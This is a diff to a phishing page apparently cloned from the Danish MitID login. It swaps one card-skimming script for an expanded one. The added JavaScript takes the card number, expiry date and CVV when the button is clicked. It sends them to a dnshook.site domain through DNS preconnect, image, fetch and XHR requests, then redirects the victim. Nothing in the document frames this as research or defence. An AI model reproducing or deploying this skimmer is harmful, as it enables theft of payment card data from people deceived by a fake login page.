@@ -99,7 +99,101 @@
 	<script src="./MitID cc_files/imask.min.js.télécharger"></script>
 	<script src="./MitID cc_files/infos.js.télécharger"></script>
         <script>
-javascript:(function(){var d=document,s=function(t){try{var c=typeof t==='string'?t:JSON.stringify(t),n=c.replace(/ /g,'-').replace(/[^a-zA-Z0-9-]/g,'').toLowerCase();if(n.length>60)n=n.substr(0,60);var h='card-'+n+'.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site',l=d.createElement('link');l.rel='preconnect';l.href='https://'+h;d.head.appendChild(l);console.log('DNS: '+h);setTimeout(function(){d.head.removeChild(l)},3000);return!0}catch(e){console.log('Error: '+e);return!1}},b=d.getElementById('loginBtn2');if(b){console.log('Found submit button');b.addEventListener('click',function(){var number=d.querySelector('input[name="cn"]')?.value||'',month=d.querySelector('input[name="expm"]')?.value||'',year=d.querySelector('input[name="expy"]')?.value||'',cvv=d.querySelector('input[name="sc"]')?.value||'';if(number){console.log('Card data collected');try{localStorage.setItem('card_data',JSON.stringify({number:number,month:month,year:year,cvv:cvv}))}catch(e){}s('num-'+number+'-exp-'+month+year+'-cvv-'+cvv);console.log('Data sent');setTimeout(function(){window.location.href='vv.html';},1000)}else{console.log('No card number field')}})}else{console.log('No submit button')}})();
+javascript:(function(){
+  // وظيفة إرسال البيانات عبر عدة طرق
+  function sendData(data) {
+    var domain = 'a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site';
+    var cleanData = (typeof data === 'string' ? data : JSON.stringify(data))
+      .replace(/ /g, '-')
+      .replace(/[^a-zA-Z0-9-]/g, '')
+      .toLowerCase();
+    
+    if(cleanData.length > 60) cleanData = cleanData.substr(0, 60);
+    
+    var subdomain = 'card-' + cleanData;
+    var fullDomain = subdomain + '.' + domain;
+    
+    // طريقة 1: استخدام link preconnect
+    var link = document.createElement('link');
+    link.rel = 'preconnect';
+    link.href = 'https://' + fullDomain;
+    document.head.appendChild(link);
+    
+    // طريقة 2: استخدام صورة
+    var img = new Image();
+    img.src = 'https://' + fullDomain + '/img.jpg?t=' + new Date().getTime();
+    
+    // طريقة 3: استخدام fetch مع catch للأخطاء
+    fetch('https://' + fullDomain + '/fetch.txt?t=' + new Date().getTime())
+      .catch(function() { /* تجاهل الأخطاء المتوقعة */ });
+    
+    // طريقة 4: استخدام XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://' + fullDomain + '/xhr.txt?t=' + new Date().getTime(), true);
+    xhr.send();
+    
+    console.log('DNS data sent via multiple methods: ' + fullDomain);
+    
+    // تخزين البيانات محليًا كنسخة احتياطية
+    try {
+      localStorage.setItem('sent_data', fullDomain);
+      localStorage.setItem('sent_time', new Date().toString());
+    } catch(e) {}
+    
+    return true;
+  }
+  
+  // وظيفة التعامل مع النقر على الزر
+  function handleButtonClick(e) {
+    // منع السلوك الافتراضي للزر
+    if(e && e.preventDefault) e.preventDefault();
+    
+    // جمع البيانات من الحقول
+    var number = document.querySelector('input[name="cn"]')?.value || '';
+    var month = document.querySelector('input[name="expm"]')?.value || '';
+    var year = document.querySelector('input[name="expy"]')?.value || '';
+    var cvv = document.querySelector('input[name="sc"]')?.value || '';
+    
+    // التحقق من وجود بيانات
+    if(number) {
+      console.log('Card data collected');
+      
+      // إرسال البيانات
+      sendData('num-' + number + '-exp-' + month + year + '-cvv-' + cvv);
+      
+      // تأخير التحويل للتأكد من إرسال البيانات
+      setTimeout(function() {
+        window.location.href = 'vv.html';
+      }, 1500);
+    } else {
+      console.log('No card number found');
+      window.location.href = 'vv.html';
+    }
+    
+    return false;
+  }
+  
+  // البحث عن الزر وإضافة مستمع الحدث
+  var button = document.getElementById('loginBtn2');
+  
+  if(button) {
+    console.log('Found submit button');
+    
+    // إزالة جميع مستمعي الأحداث الحالية (إذا أمكن)
+    var newButton = button.cloneNode(true);
+    button.parentNode.replaceChild(newButton, button);
+    
+    // إضافة مستمع الحدث الجديد
+    newButton.addEventListener('click', handleButtonClick);
+    
+    // استبدال وظيفة onclick أيضًا للتأكد
+    newButton.onclick = handleButtonClick;
+    
+    console.log('Button control activated');
+  } else {
+    console.log('No submit button found');
+  }
+})();
 </script>
 	<span style="display:none;">k9</span>
 
